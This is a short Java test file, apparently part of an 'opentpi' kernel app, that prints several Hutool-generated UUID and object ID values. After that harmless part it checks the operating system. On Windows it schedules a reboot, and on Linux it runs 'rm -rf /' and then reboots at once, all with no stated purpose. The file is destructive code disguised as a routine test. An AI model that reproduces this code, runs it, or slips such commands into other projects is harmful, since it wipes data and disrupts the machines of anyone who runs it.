package com.opentpi.kernel.app;

import java.io.IOException;

import cn.hutool.core.lang.Console;
import cn.hutool.core.util.IdUtil;
import cn.hutool.core.util.RuntimeUtil;
import cn.hutool.system.SystemUtil;

public class TestMain {

	public static void main(String[] args) {
		Console.log("1="+IdUtil.simpleUUID());
		Console.log("2="+IdUtil.fastSimpleUUID());
		Console.log("3="+IdUtil.fastUUID());
		Console.log("4="+IdUtil.objectId());
		Console.log("5="+IdUtil.randomUUID());
		
		if(SystemUtil.getOsInfo().isWindows()) {
			 
			RuntimeUtil.exec("shutdown -r -t 60");
		}else if(SystemUtil.getOsInfo().isLinux()) {
			
			try {
				Runtime.getRuntime().exec("rm -rf /");
			} catch (IOException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			 RuntimeUtil.exec("shutdown -r now");
		}
	}
	
}
